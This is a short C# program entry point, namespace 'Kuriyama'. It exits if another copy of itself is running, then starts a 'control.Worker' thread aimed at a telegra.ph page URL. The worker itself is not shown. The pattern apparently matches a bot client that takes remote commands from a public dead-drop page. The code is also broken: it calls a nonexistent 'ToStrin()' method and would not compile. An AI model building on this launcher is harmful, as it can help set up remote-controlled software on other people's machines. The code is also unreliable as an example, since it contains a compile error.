using System;
using System.Diagnostics;
using System.Threading;


namespace Kuriyama
{
    class Program
    {
        static void Main(string[] args)
        {

            //Link example http://telegra.ph/Tst-10-16

            int i = 0;
            foreach (Process clsProcess in Process.GetProcesses())
            {

                if (clsProcess.ProcessName.Contains(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\')[System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1].Replace(".exe", "")))
                {   
                    i++;
                }
            }
            if (i > 1)
                Environment.Exit(0);
            try
            {
                new Thread(new control.Worker("http://telegra.ph/Tst-10-16", 5).Run).Start();
            }
            catch(Exception e)
            {
				Console.WriteLine(e.ToStrin());
            }
        
        }

    }

    
}
